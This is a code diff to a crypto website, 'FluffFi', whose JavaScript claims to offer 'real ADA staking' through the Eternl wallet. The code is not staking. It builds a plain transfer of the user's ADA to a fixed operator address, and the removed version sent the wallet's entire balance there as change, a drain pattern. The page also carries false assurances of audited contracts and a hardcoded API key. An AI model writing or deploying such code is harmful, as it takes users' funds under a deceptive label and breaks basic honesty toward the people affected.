@@ -533,6 +533,7 @@
             <div class="staking-info">
                 <h3>Real ADA Staking</h3>
                 <p>Stake your ADA directly through Eternal Wallet. Your ADA goes directly to our staking pool for rewards!</p>
+                <p style="font-size: 0.8rem; color: #ff6b35; margin-top: 0.5rem;">⚠️ Minimum 1 ADA + transaction fees (~1-2 ADA extra needed)</p>
             </div>
 
             <div class="wallet-status" id="walletStatus">
@@ -546,7 +547,7 @@
 
                 <div class="form-group">
                     <label for="stakeAmount">Amount to stake (ADA):</label>
-                    <input type="number" id="stakeAmount" min="2" placeholder="2" step="0.1">
+                    <input type="number" id="stakeAmount" min="1" placeholder="2" step="0.001">
                 </div>
 
                 <button class="stake-now-btn" id="stakeNowBtn" disabled>
@@ -611,7 +612,7 @@
     <script src="https://unpkg.com/@emurgo/cardano-serialization-lib-browser/cardano_serialization_lib.js"></script>
 
     <script>
-        // Staking Configuration
+        // Staking Configuration (Updated with proper protocol handling)
         const BLOCKFROST_KEY = 'mainnetiT2DrrBlVvPSozkzPZ0ovE5uuJveWxJz';
         const RECEIVER_ADDRESS = 'addr1q8y94q35y2xmh8jjqaqpgw5h6sygku6nx9umejtegykc6e87dfl0l0wv4ys46hssj6cg9h8j9m7esgag7ez6l0xwy3gspn4a84';
         
@@ -626,6 +627,32 @@
         const stakeNowBtn = document.getElementById('stakeNowBtn');
         const walletStatus = document.getElementById('walletStatus');
         const stakeAmount = document.getElementById('stakeAmount');
+
+        // Utility function for hex conversion
+        function hexToBytes(hex) {
+            return Uint8Array.from(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+        }
+
+        // Fetch real protocol parameters from Blockfrost
+        async function getProtocolParams() {
+            try {
+                const response = await fetch('https://cardano-mainnet.blockfrost.io/api/v0/epochs/latest/parameters', {
+                    headers: { project_id: BLOCKFROST_KEY }
+                });
+                if (!response.ok) {
+                    throw new Error('Failed to fetch protocol parameters');
+                }
+                return await response.json();
+            } catch (error) {
+                console.error('Protocol params fetch error:', error);
+                // Fallback to hardcoded values if Blockfrost fails
+                return {
+                    min_fee_a: 44,
+                    min_fee_b: 155381,
+                    coins_per_utxo_word: "34482"
+                };
+            }
+        }
 
         // Open staking modal
         openStakingModal.addEventListener('click', (e) => {
@@ -645,64 +672,117 @@
             }
         });
 
-        // Connect Eternal Wallet
+        // Connect Eternal Wallet (Updated with better error handling)
         connectEternalBtn.addEventListener('click', async () => {
+            // Check for HTTPS
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+                alert("🔒 HTTPS required! Staking only works on HTTPS sites like GitHub Pages.\nPlease access via: https://shelby69699.github.io/fluffi/");
+                return;
+            }
+
             if (!window.cardano || !window.cardano.eternl) {
-                alert("🦊 Eternal Wallet not found! Please install the Eternal Wallet extension first.");
+                alert("🦊 Eternal Wallet not found!\n\nPlease:\n1. Install Eternal Wallet extension\n2. Refresh this page\n3. Try again");
                 window.open('https://eternl.io/', '_blank');
                 return;
             }
 
             try {
                 connectEternalBtn.textContent = 'Connecting...';
+                connectEternalBtn.disabled = true;
+                
+                // Enable the wallet
+                await window.cardano.eternl.enable();
                 walletApi = await window.cardano.eternl.enable();
+                
+                // Get wallet addresses
                 const usedAddresses = await walletApi.getUsedAddresses();
                 const address = usedAddresses[0];
+                
+                // Check wallet balance
+                const balance = await walletApi.getBalance();
+                const balanceValue = window.CardanoSerializationLib.Value.from_bytes(hexToBytes(balance));
+                const adaBalance = parseInt(balanceValue.coin().to_str()) / 1000000;
                 
                 walletConnected = true;
                 walletStatus.innerHTML = `
                     <div style="color: #10b981; font-weight: 600;">✅ Wallet Connected</div>
                     <div style="font-size: 0.8rem; margin-top: 0.5rem;">${address.substring(0, 20)}...${address.substring(address.length - 10)}</div>
+                    <div style="font-size: 0.8rem; color: #ff6b35; font-weight: 600;">Balance: ${adaBalance.toFixed(2)} ADA</div>
                 `;
                 connectEternalBtn.style.display = 'none';
                 stakeNowBtn.disabled = false;
                 
                 console.log('Eternal Wallet connected successfully');
+                console.log('Wallet balance:', adaBalance, 'ADA');
             } catch (err) {
                 console.error('Wallet connection failed:', err);
-                alert("❌ Failed to connect to Eternal Wallet. Please try again.");
+                alert("❌ Failed to connect to Eternal Wallet.\n\nPlease:\n1. Ensure Eternal is unlocked\n2. Grant permission when prompted\n3. Try again");
                 connectEternalBtn.textContent = '🔗 Connect Eternal Wallet';
+                connectEternalBtn.disabled = false;
             }
         });
 
-        // Stake ADA
+        // Stake ADA (Updated with improved transaction building)
         stakeNowBtn.addEventListener('click', async () => {
             const amountInput = stakeAmount.value;
             const amountADA = parseFloat(amountInput);
             
-            if (isNaN(amountADA) || amountADA < 2) {
-                alert("⚠️ Please enter a valid ADA amount (minimum 2 ADA).");
+            if (isNaN(amountADA) || amountADA <= 0) {
+                alert("⚠️ Please enter a valid ADA amount (minimum 0.001 ADA).");
                 return;
             }
 
-            if (!walletConnected) {
+            if (amountADA < 1) {
+                alert("⚠️ Minimum stake amount is 1 ADA to cover transaction fees.");
+                return;
+            }
+
+            if (!walletConnected || !walletApi) {
                 alert("❌ Please connect your wallet first.");
                 return;
             }
 
             try {
-                stakeNowBtn.textContent = 'Processing Transaction...';
+                stakeNowBtn.textContent = 'Building Transaction...';
                 stakeNowBtn.disabled = true;
 
-                const csl = window.cardano_serialization_lib;
+                const csl = window.CardanoSerializationLib;
+                
+                // Check wallet balance first
+                const balance = await walletApi.getBalance();
+                const balanceValue = csl.Value.from_bytes(hexToBytes(balance));
+                const adaBalance = parseInt(balanceValue.coin().to_str()) / 1000000;
+                
+                if (adaBalance < amountADA + 2) { // Reserve 2 ADA for fees
+                    alert(`❌ Insufficient balance!\n\nYou have: ${adaBalance.toFixed(2)} ADA\nNeed: ${amountADA + 2} ADA (including fees)\n\nPlease reduce the amount or add more ADA to your wallet.`);
+                    return;
+                }
+
+                // Fetch UTXOs
                 const utxosHex = await walletApi.getUtxos();
-                const utxos = utxosHex.map(u => csl.TransactionUnspentOutput.from_bytes(Buffer.from(u, 'hex')));
+                if (!utxosHex || utxosHex.length === 0) {
+                    alert("❌ No UTXOs available in wallet. Please ensure your wallet has ADA.");
+                    return;
+                }
+                const utxos = utxosHex.map(u => csl.TransactionUnspentOutput.from_bytes(hexToBytes(u)));
+
+                stakeNowBtn.textContent = 'Fetching Protocol Parameters...';
+
+                // Fetch protocol parameters from Blockfrost
+                const protocolParams = await getProtocolParams();
+                console.log('Protocol parameters:', protocolParams);
+
+                const linearFee = csl.LinearFee.new(
+                    csl.BigNum.from_str(protocolParams.min_fee_a.toString()),
+                    csl.BigNum.from_str(protocolParams.min_fee_b.toString())
+                );
+                const coinsPerUtxoWord = csl.BigNum.from_str(protocolParams.coins_per_utxo_word.toString());
 
                 const txBuilderCfg = csl.TransactionBuilderConfigBuilder.new()
-                    .fee_algo(csl.LinearFee.new(csl.BigNum.from_str("44"), csl.BigNum.from_str("155381")))
-                    .coins_per_utxo_word(csl.BigNum.from_str("34482"))
-                    .pool_deposit(csl.BigNum.from_str("500000000"))
-                    .key_deposit(csl.BigNum.from_str("2000000"))
+                    .fee_algo(linearFee)
+                    .coins_per_utxo_word(coinsPerUtxoWord)
+                    .pool_deposit(csl.BigNum.from_str('0'))
+                    .key_deposit(csl.BigNum.from_str('0'))
                     .max_value_size(5000)
                     .max_tx_size(16384)
                     .prefer_pure_change(true)
@@ -710,31 +790,63 @@
 
                 const txBuilder = csl.TransactionBuilder.new(txBuilderCfg);
 
-                for (let utxo of utxos) {
-                    txBuilder.add_input(utxo.output().address(), utxo.input(), utxo.output().amount());
-                }
+                stakeNowBtn.textContent = 'Building Transaction...';
 
-                const output = csl.TransactionOutput.new(
+                // Add inputs
+                utxos.forEach(utxo => {
+                    const input = utxo.input();
+                    const output = utxo.output();
+                    txBuilder.add_input(output.address(), input, output.amount());
+                });
+
+                // Add output
+                const adaAmountLovelace = csl.BigNum.from_str((amountADA * 1000000).toString());
+                const txOutput = csl.TransactionOutput.new(
                     csl.Address.from_bech32(RECEIVER_ADDRESS),
-                    csl.Value.new(csl.BigNum.from_str((amountADA * 1000000).toString()))
+                    csl.Value.new(adaAmountLovelace)
                 );
-                txBuilder.add_output(output);
-                txBuilder.add_change_if_needed(csl.Address.from_bech32(RECEIVER_ADDRESS));
+                txBuilder.add_output(txOutput);
 
+                // Set change to first wallet address
+                const usedAddresses = await walletApi.getUsedAddresses();
+                const changeAddress = csl.Address.from_bech32(usedAddresses[0]);
+                txBuilder.add_change_if_needed(changeAddress);
+
+                stakeNowBtn.textContent = 'Signing Transaction...';
+
+                // Build, sign, and submit
                 const txBody = txBuilder.build();
                 const tx = csl.Transaction.new(txBody, csl.TransactionWitnessSet.new());
-
-                const signedTxHex = await walletApi.signTx(Buffer.from(tx.to_bytes()).toString('hex'), true);
+                const txHex = Buffer.from(tx.to_bytes()).toString('hex');
+                
+                const signedTxHex = await walletApi.signTx(txHex, true);
+                
+                stakeNowBtn.textContent = 'Submitting Transaction...';
+                
                 const txHash = await walletApi.submitTx(signedTxHex);
 
-                alert(`🎉 Staking successful! Transaction Hash: ${txHash}\n\n💰 You staked ${amountADA} ADA to FluffFi!`);
+                alert(`🎉 STAKING SUCCESSFUL!\n\nTransaction Hash: ${txHash}\n\n💰 You staked ${amountADA} ADA to FluffFi!\n\n🔗 View on Cardanoscan:\nhttps://cardanoscan.io/transaction/${txHash}`);
+                
                 stakingModal.classList.remove('active');
                 stakeAmount.value = '';
                 
                 console.log('Staking transaction successful:', txHash);
+                console.log('View at: https://cardanoscan.io/transaction/' + txHash);
+                
             } catch (err) {
                 console.error('Staking transaction failed:', err);
-                alert(`❌ Staking failed: ${err.message}`);
+                let errorMessage = err.message;
+                
+                // Provide user-friendly error messages
+                if (errorMessage.includes('insufficient')) {
+                    errorMessage = "Insufficient funds! Please check your ADA balance and try with a smaller amount.";
+                } else if (errorMessage.includes('UTxO balance insufficient')) {
+                    errorMessage = "Not enough ADA for this transaction. Please try a smaller amount.";
+                } else if (errorMessage.includes('network')) {
+                    errorMessage = "Network error. Please check your connection and try again.";
+                }
+                
+                alert(`❌ Staking failed!\n\nError: ${errorMessage}\n\nTip: Make sure you have enough ADA for the stake amount plus transaction fees (~1-2 ADA).`);
             } finally {
                 stakeNowBtn.textContent = '🚀 Stake ADA Now';
                 stakeNowBtn.disabled = false;
@@ -758,7 +870,7 @@
         // Wallet address interaction (top-right)
         const walletAddressDisplay = document.getElementById('walletAddress');
         walletAddressDisplay.addEventListener('click', () => {
-            navigator.clipboard.writeText('addr1qx...7k2m').then(() => {
+            navigator.clipboard.writeText(RECEIVER_ADDRESS).then(() => {
                 const originalText = walletAddressDisplay.textContent;
                 walletAddressDisplay.textContent = 'Copied!';
                 walletAddressDisplay.style.background = 'rgba(76, 175, 80, 0.2)';
@@ -780,6 +892,13 @@
             alert('💰 $FLUFF token purchase coming soon! Stay tuned for launch details.');
         });
 
+        // Check HTTPS on page load
+        window.addEventListener('load', () => {
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+                console.warn('⚠️ HTTPS required for Eternal Wallet integration');
+            }
+        });
+
         // Console welcome message
         console.log(`
 🦊 FluffFi - The Cleverest Fox on Cardano
@@ -790,8 +909,15 @@ Welcome to FluffFi with REAL ADA STAKING!
 ⚡ Built on Cardano blockchain  
 🛡️ Secure and audited smart contracts
 💰 Real ADA staking through Eternal Wallet
+🔒 HTTPS ready for secure transactions
 
 🌐 Live at: https://shelby69699.github.io/fluffi/
+📋 Staking Address: ${RECEIVER_ADDRESS}
+
+Requirements:
+- HTTPS connection (✅ GitHub Pages)
+- Eternal Wallet extension
+- Sufficient ADA balance (amount + fees)
         `);
     </script>
 </body>
